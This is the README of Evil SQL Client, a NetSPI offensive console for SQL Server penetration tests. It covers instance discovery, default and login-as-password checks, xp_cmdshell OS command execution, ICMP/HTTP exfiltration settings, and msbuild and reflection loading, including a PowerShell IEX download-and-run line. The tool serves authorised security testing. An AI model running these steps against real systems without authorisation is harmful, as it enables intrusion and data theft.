![evilsqlclient](https://github.com/NetSPI/ESC/blob/master/screenshots/esc-logo.png)<br>

--------------------------<br>
Evil SQL Client (ESC)<br>
Version: v1.0 <Br>
Author: Scott Sutherland (@_nullbind), NetSPI 2020<Br>
<br>
Evil SQL Client (ESC) is an interactive .net SQL console client with enhanced SQL Server discovery, access, and data exfiltration features.  While ESC can be a handy SQL Client for daily tasks, it was originally designed for targeting SQL Servers during penetration tests and red team engagements.   The intent of the project is to provide an .exe, but also sample files for execution through mediums like msbuild and PowerShell.<br>
 
Most of ESC's functionality is based on the [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/), [DAFT](https://github.com/NetSPI/DAFT), [SQLC2](https://github.com/NetSPI/SQLC2), and [SQLInjectionWiki](https://sqlwiki.netspi.com/) projects which are also related to SQL Server.  At the moment ESC does not have full feature parody with the PowerUpSQL or DAFT, but the most usefull bits are there.

Below is a summary of what is covered below:
<br><br>
<strong>Execution Options</strong><br>
* <a href="#compileexe">Compile source and run via exe</a>
* <a href="#runexe">Download release and run via exe</a>
* <a href="#runmsbuild">Download and run via msbuild</a>
* <a href="#runps">Download and run via PowerShell</a>

<strong>Command Options</strong><br>
* <a href="#supportedcommands">Supported Commands (HELP)</a> <br>
* <a href="#cmddiscovery">Discovery Command Examples</a> <br>
* <a href="#cmddiscovery">Access Check Command Examples</a> <br>
* <a href="#cmdescalation">Privilege Escalation Command Examples</a> <br>
* <a href="#cmddiscovery">Exfiltration Command Examples</a> <br>
* <a href="#pendingcommands">Pending Commands</a> <br>

# Execution Options <a name="exec">
Below is a list of options for running the Evil SQl Client (ESC).

### Compile Source and Run Exe <a name="compileexe"></a>
1. Download the source from  [esc folder](https://github.com/NetSPI/ESC/tree/master/esc).
1. Open the esc.sln file in Visual Studio.
2. Select Build -> Build Solution.
3. Run esc.exe.

![buildesc](https://github.com/NetSPI/ESC/blob/master/screenshots/start-esc-compile-1.png) 
 
### Download Release and Run Exe <a name="runexe"></a>
1. Download compiled esc.exe from [releases](https://github.com/NetSPI/ESC/releases). 
2. Run esc.exe.

![runescexe](https://github.com/NetSPI/ESC/blob/master/screenshots/start-esc-compile-2.png)
  
### Download and Run via MSbuild.exe <a name="runmsbuild"></a>
 
Evil SQL Client console can be run through msbuild inline tasks using the [esc.csproj file](https://github.com/NetSPI/ESC/blob/master/esc.csproj) or [esc.xml file](https://github.com/NetSPI/ESC/blob/master/esc.xml).<br>  Using msbuild.exe to execute .net code through inline tasks is a technique that was researched and popularized by Casey Smith. Related material can be found [here](https://bleepsec.com/2018/11/26/using-attack-atomic-red-team-part1.html). 

<strong>esc.proj</strong><br>
esc.proj includes all of the original Evil SQL Client (ESC) C Sharp source code inline. 

<strong>esc.xml</strong><br>
esc.xml works a little differently and has the entire esc.exe hardcoded as a string which is then loaded through reflection using a technique recently highlighted in the [GhostBuild](https://github.com/bohops/GhostBuild) project by @bohops.  

Updating esc.xml:<br>
To update the esc.xml follow the instructions below:
1. Download and compile esc.exe.
2. Run [Out-Compressdll](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1) (by @mattifestation) against esc.exe.<br>
`Out-CompressedDll -FilePath esc.exe | out-file output.txt`
3. Replace the compressedBin string in esc.xml with the "EncodedCompressedFile" string generated from Out-CompressDll.
4. Replace compressedBinSize with the size generated from Out-CompressDll.
5. Run the script.<br>
`C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe esc.xml`

<strong>Execution Examples</strong><br>
Below are a few execution examples. Msbuild can accept a filepath on the command line, but no filepath is required if only one .csproj file exists in the directory your executing msbuild.exe from.  

In the examples below, esc.csproj has been renamed to 1.csproj:
<br><br>
 ` C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe ` <br>
 ![runescexe](https://github.com/NetSPI/ESC/blob/master/screenshots/start-esc-msbuild-1.png) 
 <br><br>
 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe esc.csproj` <Br>
 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe esc.xml` <br>
![runescexe](https://github.com/NetSPI/ESC/blob/master/screenshots/start-esc-msbuild-2.png) 
	
### Download and Run Functions via PowerShell <a name="runps"></a>
Below are some quick instructions for running ESC functions through PowerShell.

1. Download esc.exe.
2. Open PowerShell and load esc.exe through reflection.<br>
`[System.Reflection.Assembly]::LoadFile("c:\temp\esc.exe)`
3. Alternatively, [esc-example.ps1](https://github.com/NetSPI/ESC/blob/master/esc-example.ps1) contains a portable example generated using Out-Compressdll.  It can be loaded using the PowerShell command below.<br>
`IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/ESC/master/esc-example.ps1")`
4. After the assmbly is loaded you can run the desired function.  Examples below.
<pre>
[evilsqlclient.Program+EvilCommands]::GetSQLServersBroadCast()
[evilsqlclient.Program+EvilCommands]::GetSQLServersSpn()
[evilsqlclient.Program+EvilCommands]::MasterDiscoveredList
[evilsqlclient.Program+EvilCommands]::InstanceAllG = "enabled"
[evilsqlclient.Program+EvilCommands]::CheckAccess()
[evilsqlclient.Program+EvilCommands]::MasterAccessList
[evilsqlclient.Program+EvilCommands]::CheckDefaultAppPw()
[evilsqlclient.Program+EvilCommands]::CheckLoginAsPw()
[evilsqlclient.Program+EvilCommands]::MasterAccessList
</pre>

 # Supported Commands <a name="supportedcommands"></a>

 ### COMMAND LIST
 <pre>
    SHOW:
     show settings 			Show connection and exfil settings.
     show discovered 			Show discovered instances. 
     show access  			Show accessible instances, versions, and other information.
     show help 				Show this help page.
 
    CONFIGURE INSTANCE:
     set targetall			Target all accessible SQL Server instances. List with 'show access' command.
     set instance instancename		Target a single instance.  Instance formats supported include: 
 				    	server1
 				    	server1\instance1
 				    	server1,1433
     set connstring stringhere 		Set a custom connection string. Examples below.
				   	 Server=Server\Instance;Database=Master;Integrated Security=SSPI;Connection Timeout=1
				    	Server=Server\Instance;Database=Master;Integrated Security=SSPI;Connection Timeout=1;uid=Domain\Account;pwd=Password;
				    	Server=Server\Instance;Database=Master;Connection Timeout=1;User ID=Username;Password=Password
 
    CONFIGURE CREDENTIALS:
     set username username 		User for authenticatiing to SQL Server instances.
 				   	Defaults to current Windows user if no username or password is provided.
				   	Accepts SQL login, local Windows user, or domain user.  
				    	example: sqluser
				    	example: localhost\localuser
				    	example: domain\domainuser
     set password password		Password for the provided username.  
 				    	Defaults to current Windows user if no user or password is provided.
 
    QUERY COMMANDS:
     set timeout 1			Set query timeout. Useful over slow connections.
     query				Arbitrary TSQL query can be executed once a valid connection string is configured.
				    	To run against all accessible instances type 'set targetall enabled'.
				    	Type the query, then go, and press enter. Multi-line queries are supported.
				    	Note: You don't have to type the word 'query'.
				    	Example:
				    	SELECT @@VERSION
				    	GO
 
    DISCOVERY COMMANDS:
     discover broadcast			Discover SQL Server instances via a broadcast request.
     discover domainspn			Discover SQL Server instances via LDAP query to the default DC for MSSQL SPNs.
     discover file filepath		Discover SQL Server instance listed in a file.  One per line.
				    	Format examples: 
				    	hostname 
				    	hostname\instance
				    	hostname,port
     show discovered			Display the list of discovered SQL Server instances.
     export discovered outpath		Export the list of discovered SQL Server instances to a file. 
				   	 Example: export discovered c:\windows\temp\sqlinstances.txt
     clear discovered			Clear list of discovered SQL Server instances.

    INITAL ACCESS COMMANDS:
     check access			Attempts to log into all discovered SQL Server instances.  
 				    	Uses current Windows/Domain user by default. 
				    	Note: Will use alternative credentials if provided. (set username / set password)
     show access			List SQL Server instances that can be logged into.
     export access outpath		Export list of SQL Server instances that can be logged into to a file.
     clear access			Clear the in memory list of SQL Server instances that can be logged into.			
     check defaultlogins		Attempts to identify SQL Server instances that match known application and attempts the associate usernames and passwords.


    POST EXPLOITATION COMMANDS:
     list serverinfo			List server information for accessoble target SQL Server instances.
     list databases			List databases for accessoble target SQL Server instances.
     list tables			List tables information for accessoble target SQL Server instances.
  				    	Limits results to databases the login user has access to.
     list links				List links information for accessoble target SQL Server instances.
     list logins			List logins information for accessoble target SQL Server instances.
     list rolemembers			List rolemember information for accessoble target SQL Server instances.
     list privs				Check accessible target SQL Server instances for logins that use their login as a password.  
     check loginaspw     		Check accessible target SQL Server instances for logins that use their login as a password.                         
     check uncinject IP			Connect to taret SQL Server instance and perform UNC injection back to provide IP.	     
     run OSCMD command			Run os command through xp_cmdshell on the accessible target SQL Server instances. 
 				    	*Requires sysadmin privileges.
 
    CONFIGURE DATA EXFILTRATION: 
     set file enabled
     set filepath c:\temp\file.csv
     set icmp tenabled
     set icmpip 127.0.0.1
     set http enabled
     set httpurl http://127.0.0.1
     set encrypt enabled
     set enckey MyKey!
     set encsalt MySalt!

    MISC COMMANDS:
     help
     clear
     exit
 </pre>
 
 ### Common Command Sequences <a name="recommendcommands"></a>
Below are some common command examples to get you started.

<strong>Discovering SQL Server Instances</strong><br> <a name="cmddiscovery"></a>
Below are a few common methods to identify SQL Server on the network and domain without port scanning.
 
`discover domainspn`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-DomainSPN.png)<br>

`discover broadcast`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-Broadcast.png)<br>

`show discovered`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-Show.png)<br>
 
<strong>Checking Access to Discovered Instances</strong><br> <a name="cmdaccess"></a>
After discovery, `check access` can be used to determine if the current or provided credentials can login into the discovered SQL Server instances.
 
` set targetall enabled` <br>
` show settings`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-TargetAll.png)<br>
 
`check access`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-CheckAccess.png)<br>
 
`show access`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-ShowAccess.png)<br>
 

<strong>Testing for Common Password Issues</strong><br> <a name="cmdescalate"></a>
Below are some checks for common password issues that can be used to gain initial entry and escalate privileges in some environments.

`check defaultpw`
`check defaultpw` is run against discovered instances and does not require valid credentials.
[Related Reading](https://blog.netspi.com/attacking-application-specific-sql-server-instances/)
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-CheckDefaultPw.png)<br>
 
`check loginaspw`
`check loginaspw` can be used once authenticated to enumerated all logins and test if they are using the login as the password.
[Related Reading[(https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/LoginAsPw1.png)<br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/LoginAsPw2.png)<br>
 
<strong>Running OS Commands</strong><br>
Below is a ESC command for running OS commands on target instances.  It requires sysadmin privileges.

`run oscmd whoami`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/RunOsCmd1.png)<br>
 
<strong>Saving List of Accessible Servers</strong><br>
The command below can be used to export a list of servers that you can log into.
`export access c:\temp\access.csv`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport1.png)<br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport2.png)<br>
 
<strong>Data Exfiltration Example: Local File</strong><br> <a name="cmdexfiltrate"></a>
Below is an example of how to exfiltrate data to a local file.
 
`set file enabled`
`set filepath c:\temp\output.csv`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil1.png)<br>
 
`select @@version`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil2.png)<br>
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil3.png)<br>
 
<strong>Data Exfiltration Example: ICMP</strong><br>
Below is an example of how to exfiltrate data over ICMP with ESC.
 
`set icmp enabled` <br>
`set icmpip 192.168.1.1`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil1.png)<br>
 
`select @@version`
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil12.png)<br> 
![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/IcmpExfil3.png)<br>

 
# Pending Commands <a name="pendingcommands"></a>
* Add discover local 
* Add column find
* Add domain account enumeration
* Add link crawl + linkquery + linkoscmd
* Add escalate dbowner
* Add escalate imperonsate
* Threading
* Finish data encryption
* Create python/powershell script to decrypt encrypted exfiltrated data
